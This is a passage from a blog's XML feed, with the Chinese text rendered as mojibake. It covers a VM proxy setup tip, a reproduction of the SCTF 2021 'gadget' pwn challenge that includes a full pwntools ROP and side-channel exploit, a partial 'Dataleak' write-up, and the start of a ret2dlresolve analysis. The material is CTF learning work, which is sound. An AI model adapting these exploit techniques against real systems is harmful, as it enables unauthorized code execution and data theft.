alt="å®Œæˆï¼"></p><p>è¿™æ ·æˆ‘ä»¬å°±å®ç°äº†ä¸€ä¸ªæœ€ç®€å•çš„OSäº†ï¼</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ç§è™šæ‹Ÿæœºä½¿ç”¨ç‰©ç†æœºä»£ç†çš„æ–¹æ³•</title>
      <link href="/2023/11/11/%E4%B8%80%E7%A7%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E7%89%A9%E7%90%86%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2023/11/11/%E4%B8%80%E7%A7%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E7%89%A9%E7%90%86%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ç‰©ç†æœºï¼šV2rayNè®¾ç½®"><a href="#ç‰©ç†æœºï¼šV2rayNè®¾ç½®" class="headerlink" title="ç‰©ç†æœºï¼šV2rayNè®¾ç½®"></a>ç‰©ç†æœºï¼šV2rayNè®¾ç½®</h1><p>æ‰“å¼€V2rayNçš„<strong>å‚æ•°è®¾ç½®</strong>é€‰é¡¹å°†ä¸‹å›¾ä¸­çš„<strong>â€œå…è®¸æ¥è‡ªå±€åŸŸç½‘çš„é“¾æ¥â€</strong>å‹¾é€‰</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111004012130.png" alt="image-20231111004012130"></p><p>ç„¶åç‚¹å‡»ç¡®è®¤å³å¯ï¼Œç‰©ç†æœºçš„è®¾ç½®å°±è¿™ä¹ˆå¤šäº†ã€‚</p><h1 id="è™šæ‹Ÿæœºï¼šè®¾ç½®ç½‘ç»œè®¾ç½®"><a href="#è™šæ‹Ÿæœºï¼šè®¾ç½®ç½‘ç»œè®¾ç½®" class="headerlink" title="è™šæ‹Ÿæœºï¼šè®¾ç½®ç½‘ç»œè®¾ç½®"></a>è™šæ‹Ÿæœºï¼šè®¾ç½®ç½‘ç»œè®¾ç½®</h1><p>æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯<strong>ubuntu22.04.3 LTS amd64</strong>ï¼Œæ‰¾åˆ°è®¾ç½®ä¸­çš„ç½‘ç»œé€‰é¡¹ï¼Œå†è®¾ç½®ç½‘ç»œä»£ç†ç±»ä¼¼ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111004832363.png" alt="image-20231111004832363"></p><p>å…¶ä¸­ipå¡«å†™åœ¨ä¸»æœºä¸­ä½¿ç”¨<strong>ipconfig</strong>å‘½ä»¤æ¥æŸ¥æ‰¾ï¼Œç«¯å£å·è®¾å®šæ ¹æ®V2rayNä¸‹æ–¹æ‰€ç¤ºçš„<strong>å±€åŸŸç½‘</strong>ç«¯å£å·å¡«å†™ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111005410652.png" alt="image-20231111005410652"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111005018861.png" alt="image-20231111005018861"></p><p>è¿™ä¸¤æ­¥å®Œæˆåï¼Œè™šæ‹Ÿæœºå°±å¯ä»¥é€šè¿‡ä¸»æœºçš„ä»£ç†æ¥è®¿é—®ç½‘ç»œäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tricks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021SCTFå¤ç°</title>
      <link href="/2022/01/16/2021SCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/16/2021SCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTFå¤ç°"><a href="#SCTFå¤ç°" class="headerlink" title="SCTFå¤ç°"></a>SCTFå¤ç°</h1><h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><p>ä¸€ä¸ªé™æ€ç¼–è¯‘çš„æ–‡ä»¶</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116104932158.png" alt="image-20220116104932158"></p><p>æœ¬æ¥çœ‹åˆ°é™æ€ç¼–è¯‘æƒ³åˆ°çš„æ˜¯ç›´æ¥ä½¿ç”¨pwntoolsçš„å·¥å…·ï¼Œä½†æ˜¯å®é™…ä¸Šæ–‡ä»¶æ˜¯å¼€äº†æ²™ç›’çš„ï¼Œè¿™é‡Œåªæœ‰readï¼Œalarmå’Œfstatå‡½æ•°èƒ½è¢«ç³»ç»Ÿè°ƒç”¨ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116105210814.png" alt="image-20220116105210814"></p><p>ä½†æ˜¯ä»”ç»†çœ‹çœ‹åœ¨x86ä¸‹openå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å°±æ˜¯5ï¼Œè¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè½¬æ¢åˆ°32ä½æ‰§è¡Œopenä¹‹åå†å›åˆ°64ä½æ‰§è¡Œreadï¼Œæœ€åå†é€šè¿‡æµ‹ä¿¡é“æ”»å‡»è·å–flagã€‚</p><p>é¦–å…ˆå…ˆåœ¨ç¨‹åºå†…å†™ä¸‹flagçš„è·¯å¾„ï¼Œä¸ºäº†åè¾¹å¯ä»¥è°ƒç”¨openå‡½æ•°ï¼Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">è°ƒç”¨readå‡½æ•°å†™flagè·¯å¾„ </span></span><br><span class="line"><span class="string">################################&#x27;&#x27;&#x27;</span></span><br><span class="line">payload1 =<span class="string">b&#x27;a&#x27;</span>*stack_offset</span><br><span class="line">payload1+=p64(pop_rax)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(pop_rdi_rbp)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(pop_rsi_r15_rbp)</span><br><span class="line">payload1+=p64(flag_path)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload1+=p64(<span class="number">0x300</span>)</span><br><span class="line">payload1+=p64(syscall)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(mov_rdx_r12_call_r14)</span><br><span class="line">payload1+=p64(pop_rsp_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">sn(io,payload1)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é€šè¿‡retfè½¬åŒ–ä¸º32ä½ç„¶åè°ƒç”¨open</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################</span></span><br><span class="line"><span class="string">åœ¨32ä½ä¸‹è°ƒç”¨openå‡½æ•°</span></span><br><span class="line"><span class="string">################&#x27;&#x27;&#x27;</span></span><br><span class="line">payload2 =<span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rcx)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload2+=p64(flag_path)</span><br><span class="line">payload2+=p64(<span class="number">0x300</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rax)</span><br><span class="line">payload2+=p64(<span class="number">5</span>)</span><br><span class="line">payload2+=p64(retf)</span><br><span class="line">payload2+=p32(int_80)</span><br><span class="line">payload2+=p32(<span class="number">0x23</span>)<span class="comment"># $cs=0x23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå†è¿”å›64ä½é€šè¿‡readå‡½æ•°æ¥å†™flagåˆ°bssæ®µ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">è¿”å›64ä½è°ƒç”¨readå‡½æ•°å†™flagåˆ°bssä¸€åŒºåŸŸ</span></span><br><span class="line"><span class="string">################################&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2+=p32(retf)</span><br><span class="line">payload2+=p32(pop_rdi_rbp)</span><br><span class="line">payload2+=p32(<span class="number">0x33</span>)<span class="comment"># $cs=0x33</span></span><br><span class="line">payload2+=p64(<span class="number">3</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rsi_r15_rbp)</span><br><span class="line">payload2+=p64(read_flag_addr)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rax)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤ä¹‹å‰çš„éƒ½å¾ˆç®€å•ï¼Œå›°éš¾çš„æ˜¯è¿™ä¹ˆæµ‹ä¿¡é“æ”»å‡»ï¼Œé¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“è¦è¿›è¡Œæµ‹ä¿¡é“æ”»å‡»çš„è¯å¾—å…ˆæ‰¾åˆ°ä¸€ä¸ªloopæŒ‡ä»¤ï¼Œè¿™æ ·å½“æˆ‘ä»¬æ‰¾åˆ°flagå¯¹åº”çš„å­—ç¬¦åå¯ä»¥è°ƒè½¬åˆ°æ­¤æ­»å¾ªç¯ä¸­ã€‚</p><p>è¿™é‡Œæˆ‘é‡‡å–çš„æ–¹æ³•æ˜¯å°†raxå¡«å…¥jmp raxçš„åœ°å€å†è°ƒæ•´åˆ°jmp raxå¤„ä»è€Œè¾¾åˆ°æ­»å¾ªç¯çš„è¦æ±‚</p><p>é‚£ä¹ˆå‰©ä¸‹çš„æ¡ä»¶å°±åªæœ‰ä¸€ä¸ªå¯ä»¥åˆ¤æ–­æˆ‘ä»¬å­—ç¬¦çš„æŒ‡ä»¤äº†</p><p>æˆ‘ä»¬æœç´¢subå’Œret</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116133910476.png" alt="image-20220116133910476"></p><p>å‘ç°æœ‰è¿™æ ·ä¸€æ¡æŒ‡ä»¤é‚£ä¹ˆåªéœ€è¦æ­é…jneæŒ‡ä»¤å°±å¯ä»¥åšåˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œå”¯ä¸€éº»çƒ¦çš„å°±æ˜¯å¾—æ§åˆ¶å†™å…¥åœ°å€ï¼Œä½†æ˜¯ä¹Ÿä¸ç®—æ˜¯ç‰¹åˆ«å›°éš¾çš„äº‹æƒ…ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="string">&#x27;&#x27;&#x27;#################################</span></span><br><span class="line"><span class="string">   æµ‹ä¿¡é“æ”»å‡»</span></span><br><span class="line"><span class="string">   #################################&#x27;&#x27;&#x27;</span></span><br><span class="line">   payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">   payload2+=p64(rbx_need)</span><br><span class="line">   payload2+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload2+=p64(sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret)</span><br><span class="line">   payload2+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">   payload2+=p64(jne_ret)</span><br><span class="line">   payload2+=p64(pop_rax)</span><br><span class="line">   payload2+=p64(jmp_rax)</span><br><span class="line">   payload2+=p64(jmp_rax)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexpï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout=<span class="number">3</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_offset=<span class="number">56</span></span><br><span class="line">retf = <span class="number">0x4011ed</span></span><br><span class="line">syscall=<span class="number">0x401165</span></span><br><span class="line">int_80=<span class="number">0x4011f3</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x401001</span></span><br><span class="line">pop_rdi_rbp = <span class="number">0x401734</span></span><br><span class="line">pop_rsi_r15_rbp = <span class="number">0x401732</span></span><br><span class="line">pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp = <span class="number">0x40172e</span></span><br><span class="line">pop_r12_pop_r14_pop_r15_pop_rbp = <span class="number">0x40172f</span> </span><br><span class="line">pop_rsp_pop_r14_pop_r15_pop_rbp = <span class="number">0x401730</span></span><br><span class="line">mov_rdx_r12_call_r14 = <span class="number">0x402c07</span></span><br><span class="line">pop_rcx = <span class="number">0x40117b</span></span><br><span class="line">jne_ret = <span class="number">0x408853</span></span><br><span class="line">sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret = <span class="number">0x403f14</span></span><br><span class="line">jmp_rax = <span class="number">0X40107e</span></span><br><span class="line">ret = <span class="number">0x401002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=(bss_addr &amp; <span class="number">0xfffffffffffff000</span>) + <span class="number">0xD00</span> <span class="comment">#openåreadçš„èµ·å§‹ä½ç½®</span></span><br><span class="line">flag_path=fake_stack-<span class="number">0x10</span> <span class="comment">#openæ‰€éœ€è¦çš„å­—ç¬¦ä¸²</span></span><br><span class="line">flag_addr_base=fake_stack - <span class="number">0x200</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">io,off,cha</span>):</span></span><br><span class="line">    <span class="comment">#success(&#x27;bss_addr: &#x27;+hex(bss_addr))</span></span><br><span class="line">    <span class="comment">#success(&#x27;fake_stack: &#x27;+hex(fake_stack))</span></span><br><span class="line">    <span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">    rbx_need=flag_addr_base+cha</span><br><span class="line">    read_flag_addr=rbx_need+<span class="number">0x41</span>-off</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">    è°ƒç”¨readå‡½æ•°å†™flagè·¯å¾„ </span></span><br><span class="line"><span class="string">    ################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload1 =<span class="string">b&#x27;a&#x27;</span>*stack_offset</span><br><span class="line">    payload1+=p64(pop_rax)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(pop_rdi_rbp)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload1+=p64(flag_path)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload1+=p64(<span class="number">0x300</span>)</span><br><span class="line">    payload1+=p64(syscall)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(mov_rdx_r12_call_r14)</span><br><span class="line">    payload1+=p64(pop_rsp_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    sn(io,payload1)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################</span></span><br><span class="line"><span class="string">    åœ¨32ä½ä¸‹è°ƒç”¨openå‡½æ•°</span></span><br><span class="line"><span class="string">    ################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload2 =<span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rcx)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload2+=p64(flag_path)</span><br><span class="line">    payload2+=p64(<span class="number">0x300</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(<span class="number">5</span>)</span><br><span class="line">    payload2+=p64(retf)</span><br><span class="line">    payload2+=p32(int_80)</span><br><span class="line">    payload2+=p32(<span class="number">0x23</span>)<span class="comment"># $cs=0x23</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">    è¿”å›64ä½è°ƒç”¨readå‡½æ•°å†™flagåˆ°bssä¸€åŒºåŸŸ</span></span><br><span class="line"><span class="string">    ################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    payload2+=p32(retf)</span><br><span class="line">    payload2+=p32(pop_rdi_rbp)</span><br><span class="line">    payload2+=p32(<span class="number">0x33</span>)<span class="comment"># $cs=0x33</span></span><br><span class="line">    payload2+=p64(<span class="number">3</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload2+=p64(read_flag_addr)</span><br><span class="line">    </span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;#################################</span></span><br><span class="line"><span class="string">    æµ‹ä¿¡é“æ”»å‡»</span></span><br><span class="line"><span class="string">    #################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload2+=p64(rbx_need)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">    payload2+=p64(sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    payload2+=p64(jne_ret)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(jmp_rax)</span><br><span class="line">    payload2+=p64(jmp_rax)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sl(io,payload2)</span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        strl=<span class="string">&quot;ç°åœ¨æ˜¯ç¬¬&quot;</span>+<span class="built_in">str</span>(off)+<span class="string">&quot;ä½&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(strl)</span><br><span class="line">        <span class="keyword">for</span> cha <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">127</span>):</span><br><span class="line">            io=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                exp(io,off,cha)</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(cha)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>+flag)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(cha)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    pause()</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="Dataleak"><a href="#Dataleak" class="headerlink" title="Dataleak"></a>Dataleak</h2><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„v6é‡Œå‚¨å­˜çš„æ˜¯æˆ‘ä»¬æƒ³è¦çš„flagã€‚æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•å°†å…¶æ³„éœ²å‡ºæ¥å°±å¥½äº†ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135703799.png" alt="image-20220117135703799"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æœ‰æ‰“å°å‡½æ•°ï¼Œä½†æ˜¯æ‰“å°çš„èŒƒå›´æ˜¯å°äºv5çš„å†…å­˜å¤§å°çš„ï¼Œå°±ç®—v5æ²¡æœ‰æˆªæ­¢ç¬¦ï¼Œè¿™é‡Œä¹Ÿæ˜¯æ²¡åŠæ³•æ³„éœ²å‡ºflagçš„ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135836681.png" alt="image-20220117135836681"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135625231.png" alt="image-20220117135625231"></p><p>é‚£ä¹ˆå¯èƒ½æœ‰é—®é¢˜çš„åœ°æ–¹å°±åœ¨writeä¹‹å‰è°ƒç”¨çš„å‡½æ•°äº†</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117144031745.png" alt="image-20220117144031745"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº_dl_runtime_resolveåˆ†æä¸ret2dlresolve</title>
      <link href="/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/"/>
      <url>/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰æ€»ç»“äº†é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ï¼Œè¿™æ¬¡æˆ‘ä»¬è¦çœŸæ­£è®¨è®ºä¸€ä¸‹ret2dlçš„æ”»å‡»æ–¹æ³•ã€‚åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦æŠŠ_dl_runtime_resolveè¿›è¡Œä¸€ä¸‹åˆ†æã€‚</p><h1 id="dl-runtime-resolveåˆ†æ"><a href="#dl-runtime-resolveåˆ†æ" class="headerlink" title="_dl_runtime_resolveåˆ†æ"></a>_dl_runtime_resolveåˆ†æ</h1><p>æˆ‘åœ¨ç½‘ä¸ŠæŸ¥åˆ°èµ„æ–™æ˜¯è¿™ä¸ªå‡½æ•°åœ¨<em>\sysdeps\x86_64\dl-trampoline.S</em>è·¯å¾„é‡Œã€‚ä½†æ˜¯é‡Œé¢æ²¡æœ‰æ‰¾è¯¥å‡½æ•°çš„ä»£ç å®ç°ï¼Œæˆ‘åˆçœ‹äº†çœ‹ä»–çš„å¤´æ–‡ä»¶ï¼Œå®é™…ä¸Šçš„ä»£ç çš„å®ç°æ˜¯ä¿å­˜åœ¨<em>\sysdeps\x86_64\dl-trampoline.h</em>é‡Œã€‚ä»£ç æ˜¯ç”¨æ±‡ç¼–å®ç°çš„ï¼Œ</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.globl</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.hidden</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.type</span> _dl_runtime_resolve, @function</span><br><span class="line"><span class="meta">.align</span> <span class="number">16</span></span><br><span class="line">cfi_startproc</span><br><span class="line"><span class="symbol">_dl_runtime_resolve:</span></span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">16</span>) # Incorporate PLT</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"># if LOCAL_STORAGE_AREA != <span class="number">8</span></span><br><span class="line">#  error LOCAL_STORAGE_AREA must be <span class="number">8</span></span><br><span class="line"># endif</span><br><span class="line">pushq %rbx# <span class="keyword">push</span> subtracts stack by <span class="number">8</span>.</span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">8</span>)</span><br><span class="line">cfi_rel_offset(%rbx, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">mov</span> %RSP_LP, %RBX_LP</span><br><span class="line">cfi_def_cfa_register(%rbx)</span><br><span class="line"><span class="keyword">and</span> $-VEC_SIZE, %RSP_LP</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">sub</span> $REGISTER_SAVE_AREA, %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(REGISTER_SAVE_AREA)</span><br><span class="line"># Preserve registers otherwise clobbered.</span><br><span class="line"><span class="keyword">movq</span> %rax, REGISTER_SAVE_RAX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rcx, REGISTER_SAVE_RCX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdx, REGISTER_SAVE_RDX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rsi, REGISTER_SAVE_RSI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdi, REGISTER_SAVE_RDI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r8, REGISTER_SAVE_R8(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r9, REGISTER_SAVE_R9(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">0</span>), (REGISTER_SAVE_VEC_OFF)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">1</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">2</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">3</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">4</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">5</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">6</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">7</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp)</span><br><span class="line">#ifndef __ILP32__</span><br><span class="line"># We also have to preserve <span 